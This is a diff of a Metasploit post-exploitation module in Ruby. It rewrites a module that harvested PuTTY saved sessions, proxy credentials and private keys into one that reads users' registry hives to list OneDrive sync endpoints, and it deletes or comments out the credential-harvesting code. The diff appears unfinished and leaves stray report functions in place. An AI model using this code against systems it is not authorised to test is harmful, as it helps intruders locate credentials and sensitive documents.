@@ -2,22 +2,26 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+require 'pp'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
   include Msf::Post::Common
   include Msf::Post::File
   include Msf::Post::Windows::Registry
+  include Msf::Post::Windows::UserProfiles
 
-  INTERESTING_KEYS = ['HostName', 'UserName', 'PublicKeyFile', 'PortNumber', 'PortForwardings','ProxyUsername','ProxyPassword']
-  PAGEANT_REGISTRY_KEY = "HKCU\\Software\\SimonTatham\\PuTTY"
-  PUTTY_PRIVATE_KEY_ANALYSIS = ['Name', 'HostName', 'UserName', 'PublicKeyFile', 'Type', 'Cipher', 'Comment']
+
+  SYNC_ENGINES_KEYS = ["LibraryType","LastModifiedTime","MountPoint","UrlNamespace"]
+  ONEDRIVE_ACCOUNT_KEYS = ["Business", "ServiceEndpointUri", "SPOResourceId", "UserEmail", "UserFolder", "UserName"]
 
   def initialize(info = {})
     super(update_info(info,
                       'Name'            => "OneDrive Sync Provider Enumeration Module",
                       'Description'     => %q{
-                        This module will identify the Office 365 sync endpoints 
+                        This module will identify the Office 365 OneDrive endpoints for both business and personal accounts
+                        across all users (providing access is permitted). It is useful for identifying document libraries 
+                        that may otherwise not be obvious which could contain sensitive or useful information.
                        },
                       'License'         => MSF_LICENSE,
                       'Platform'        => ['win'],
@@ -26,19 +30,6 @@ class MetasploitModule < Msf::Post
                      ))
   end
 
-  def get_saved_session_details(sessions)
-    all_sessions = []
-    sessions.each do |ses|
-      newses = {}
-      newses['Name'] = Rex::Text.uri_decode(ses)
-      INTERESTING_KEYS.each do |key|
-        newses[key] = registry_getvaldata("#{PAGEANT_REGISTRY_KEY}\\Sessions\\#{ses}", key).to_s
-      end
-      all_sessions << newses
-      report_note(host: target_host, type: "putty.savedsession", data: newses, update: :unique_data)
-    end
-    all_sessions
-  end
 
   def display_saved_sessions_report(info)
     # Results table holds raw string data
@@ -206,67 +197,88 @@ class MetasploitModule < Msf::Post
     private_key_summary
   end
 
+  def get_syncengine_data(master,syncengines)
+    all_syncengines = {}
+    syncengines.each do |ses|
+      newses = {}
+      SYNC_ENGINES_KEYS.each do |key|
+        newses[key] = registry_getvaldata("#{master}\\#{ses}", key).to_s
+      end
+      all_syncengines[ses] = newses
+    end
+    all_syncengines
+  end
+
   # Entry point
   def run
 
   userhives=load_missing_hives()
   userhives.each do |hive|
     next if hive['HKU'] == nil
-    master_key = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security"
-
-    # Look for saved sessions, break out if not.
-    print_status("Looking for saved PuTTY sessions")
-    saved_sessions = registry_enumkeys("#{PAGEANT_REGISTRY_KEY}\\Sessions")
-    if saved_sessions.nil? || saved_sessions.empty?
-      print_error('No saved sessions found')
-    else
-
-      # Tell the user how many sessions have been found (with correct English)
-      print_status("Found #{saved_sessions.count} session#{saved_sessions.count > 1 ? 's' : ''}")
-
-      # Retrieve the saved session details & print them to the screen in a report
-      all_saved_sessions = get_saved_session_details(saved_sessions)
-      display_saved_sessions_report(all_saved_sessions)
-
-      # If the private key file has been configured, retrieve it and save it to loot
-      print_status("Downloading private keys...")
-      private_key_info = grab_private_keys(all_saved_sessions)
-      if !private_key_info.nil? && !private_key_info.empty?
-        print_line
-        display_private_key_analysis(private_key_info)
-      end
+    master_key = "#{hive['HKU']}\\Software\\SyncEngines\\Providers\\OneDrive"
+    saved_syncengines = registry_enumkeys(master_key)
+    if saved_syncengines.nil? || saved_syncengines.empty?
+      print_error('No OneDrive synchronised endpoints found.')
+      next
     end
+    all_syncengines = get_syncengine_data(master_key, saved_syncengines)
+    pp all_syncengines
+  end
+  unload_our_hives(userhives)
 
-    print_line # Just for readability
-
-    # Now search for SSH stored keys. These could be useful because it shows hosts that the user
-    # has previously connected to and accepted a key from.
-    print_status("Looking for previously stored SSH host key fingerprints")
-    stored_ssh_host_keys = registry_enumvals("#{PAGEANT_REGISTRY_KEY}\\SshHostKeys")
-    if stored_ssh_host_keys.nil? || stored_ssh_host_keys.empty?
-      print_error('No stored SSH host keys found')
-    else
-      # Tell the user how many sessions have been found (with correct English)
-      print_status("Found #{stored_ssh_host_keys.count} stored key fingerprint#{stored_ssh_host_keys.count > 1 ? 's' : ''}")
-
-      # Retrieve the saved session details & print them to the screen in a report
-      print_status("Downloading stored key fingerprints...")
-      all_stored_keys = get_stored_host_key_details(stored_ssh_host_keys)
-      if all_stored_keys.nil? || all_stored_keys.empty?
-        print_error("No stored key fingerprints found")
-      else
-        display_stored_host_keys_report(all_stored_keys)
-      end
-    end
-
-    print_line # Just for readability
-
-    print_status("Looking for Pageant...")
-    hwnd = client.railgun.user32.FindWindowW("Pageant", "Pageant")
-    if hwnd['return']
-      print_good("Pageant is running (Handle 0x#{sprintf('%x', hwnd['return'])})")
-    else
-      print_error("Pageant is not running")
-    end
+#    # Look for saved sessions, break out if not.
+#    print_status("Looking for saved PuTTY sessions")
+#    saved_sessions = registry_enumkeys("#{PAGEANT_REGISTRY_KEY}\\Sessions")
+#    if saved_sessions.nil? || saved_sessions.empty?
+#      print_error('No saved sessions found')
+#    else
+#
+#      # Tell the user how many sessions have been found (with correct English)
+#      print_status("Found #{saved_sessions.count} session#{saved_sessions.count > 1 ? 's' : ''}")
+#
+#      # Retrieve the saved session details & print them to the screen in a report
+#      all_saved_sessions = get_saved_session_details(saved_sessions)
+#      display_saved_sessions_report(all_saved_sessions)
+#
+#      # If the private key file has been configured, retrieve it and save it to loot
+#      print_status("Downloading private keys...")
+#      private_key_info = grab_private_keys(all_saved_sessions)
+#      if !private_key_info.nil? && !private_key_info.empty?
+#        print_line
+#        display_private_key_analysis(private_key_info)
+#      end
+#    end
+#
+#    print_line # Just for readability
+#
+#    # Now search for SSH stored keys. These could be useful because it shows hosts that the user
+#    # has previously connected to and accepted a key from.
+#    print_status("Looking for previously stored SSH host key fingerprints")
+#    stored_ssh_host_keys = registry_enumvals("#{PAGEANT_REGISTRY_KEY}\\SshHostKeys")
+#    if stored_ssh_host_keys.nil? || stored_ssh_host_keys.empty?
+#      print_error('No stored SSH host keys found')
+#    else
+#      # Tell the user how many sessions have been found (with correct English)
+#      print_status("Found #{stored_ssh_host_keys.count} stored key fingerprint#{stored_ssh_host_keys.count > 1 ? 's' : ''}")
+#
+#      # Retrieve the saved session details & print them to the screen in a report
+#      print_status("Downloading stored key fingerprints...")
+#      all_stored_keys = get_stored_host_key_details(stored_ssh_host_keys)
+#      if all_stored_keys.nil? || all_stored_keys.empty?
+#        print_error("No stored key fingerprints found")
+#      else
+#        display_stored_host_keys_report(all_stored_keys)
+#      end
+#    end
+#
+#    print_line # Just for readability
+#
+#    print_status("Looking for Pageant...")
+#    hwnd = client.railgun.user32.FindWindowW("Pageant", "Pageant")
+#    if hwnd['return']
+#      print_good("Pageant is running (Handle 0x#{sprintf('%x', hwnd['return'])})")
+#    else
+#      print_error("Pageant is not running")
+#    end
   end
 end
